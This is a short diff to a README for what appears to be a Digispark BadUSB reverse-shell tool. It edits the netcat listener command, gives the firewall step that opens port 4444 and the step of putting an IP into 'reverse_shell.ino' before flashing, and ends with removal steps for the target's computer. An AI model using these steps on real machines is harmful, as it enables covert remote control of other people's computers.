@@ -13,14 +13,14 @@
 `sudo ufw allow 4444`
 
 
-`nc -lp 4444`
+`nc -l 4444`
 
 
 Change the IP on line 17 to your local IP in `reverse_shell.ino` file, then upload to your digispark. Done! Happy exploiting.
 
 ## How to remove:
 
-Go to `C:\` and on windows use `rmdir /S /Q win/`
+Go to `C:\` and use the command `rmdir /S /Q win/`
 
 
 Then reboot the target's compueter
